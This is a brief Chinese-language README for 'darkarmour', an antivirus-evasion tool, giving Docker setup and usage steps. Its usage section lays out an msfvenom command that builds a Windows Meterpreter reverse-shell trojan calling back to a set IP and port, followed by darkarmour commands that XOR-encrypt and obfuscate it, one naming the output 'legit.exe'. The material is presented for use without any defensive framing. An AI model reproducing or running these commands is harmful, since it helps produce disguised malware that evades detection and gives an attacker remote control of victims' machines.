# darkarmour
darkarmour是一个免杀工具


### 安装方法
```
docker build .
```

```
docker run -it xxxxxx bash
```



### 使用方法

#### 一、生成木马程序
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.160.129 LPORT=4444 -f exe -o exploit.exe
```
#### 二、生成混淆程序
```
python3 darkarmour.py -f /root/exploit.exe -e xor -j -k darkbyte -l 500 -u -o /root/exploit_encoded.exe
```
或者
```
python3 darkarmour.py -f bins/meter.exe --encrypt xor --jmp -o bins/legit.exe --loop 5
```
